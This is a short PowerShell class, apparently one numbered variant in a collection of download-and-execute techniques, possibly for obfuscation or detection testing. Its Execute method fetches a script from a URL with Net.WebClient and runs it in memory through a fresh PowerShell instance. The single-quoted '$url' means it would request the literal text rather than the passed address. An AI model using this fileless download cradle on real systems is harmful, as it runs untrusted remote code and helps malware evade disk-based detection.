Class ObfDownloadFileContent14 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\8
        Write-Host [PowerShell]::Create().AddScript(((New-Object Net.WebClient).DownloadString('$url'))).Invoke()
    }

}